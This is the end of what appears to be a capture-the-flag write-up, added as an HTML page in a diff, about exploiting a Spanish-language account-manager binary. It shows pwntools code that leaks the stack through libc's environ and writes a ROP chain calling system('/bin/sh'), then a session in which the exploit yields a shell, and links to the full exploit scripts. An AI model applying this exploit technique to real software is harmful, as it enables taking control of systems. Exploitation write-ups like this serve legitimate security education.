+<span class="giallo-l"><span>env</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> arb_read</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">2</span><span style="color: #9399B2;">,</span><span> libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>environ</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>stack</span><span style="color: #94E2D5;"> =</span><span> env</span><span style="color: #94E2D5;"> -</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">120</span><span style="color: #9399B2;font-style: italic;"> # We must check the offset with gdb</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>gadgets</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> ROP</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>sh</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;font-style: italic;"> next</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">search</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">b</span><span style="color: #A6E3A1;">&quot;/bin/sh</span><span style="color: #F5C2E7;">\x00</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">4</span><span style="color: #9399B2;">,</span><span> stack</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>gadgets</span><span style="color: #9399B2;">.</span><span>rdi</span><span style="color: #9399B2;">.</span><span>address</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>sh</span><span style="color: #9399B2;">)[:</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">])</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">,</span><span> stack</span><span style="color: #94E2D5;">+</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">10</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>gadgets</span><span style="color: #9399B2;">.</span><span>ret</span><span style="color: #9399B2;">.</span><span>address</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>system</span><span style="color: #9399B2;">)[:</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">])</span></span></code></pre>
+<p>After exiting, we receive our shell.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>lokete@kpwn:~</span><span style="color: #9399B2;">$</span><span> python3 env.py </span></span>
+<span class="giallo-l"><span>[*] glibc base = 0x798df2c00000</span></span>
+<span class="giallo-l"><span>[*] environ = 0x7ffd83d33bc8</span></span>
+<span class="giallo-l"><span>[*] return address = 0x7ffd83d33aa8</span></span>
+<span class="giallo-l"><span>Dime el id de la cuenta</span></span>
+<span class="giallo-l"><span>Dime el nombre:</span></span>
+<span class="giallo-l"><span>Dime la contraseña:</span></span>
+<span class="giallo-l"><span>Elige una opción:</span></span>
+<span class="giallo-l"><span>	1. Crear una cuenta</span></span>
+<span class="giallo-l"><span>	2. Imprimir una cuenta</span></span>
+<span class="giallo-l"><span>	3. Actualizar una cuenta</span></span>
+<span class="giallo-l"><span>	4. Salir</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">&gt;</span><span> $ 4</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">$</span><span> id</span></span>
+<span class="giallo-l"><span>uid=1000(lokete) gid=1000(lokete) groups=1000(lokete)</span></span></code></pre><h3 id="full-scripts">Full scripts:</h3>
+<ul>
+<li>Custom <code>dtor_list</code> inside TLS Storage: <a href="/assets/gestorcuentas/tls_into_tls.py">tls_into_tls.py</a></li>
+<li>Custom <code>dtor_list</code> inside <code>accounts</code> array: <a href="/assets/gestorcuentas/tls_into_acc.py">tls_into_acc.py</a></li>
+<li>Intended solution with env leak: <a href="/assets/gestorcuentas/env.py">env.py</a></li>
+</ul>
+
+  </div>
+</section>
+
+    </main>
+    <hr>
+    <footer>
+      <p>© 2026 Jorge Moreno Cano. Powered by <a href="https://www.getzola.org/">Zola</a>, you can download the theme <a href="https://github.com/mxaddict/zolanight">here</a></p>
+    </footer>
+  </body>
+</html>
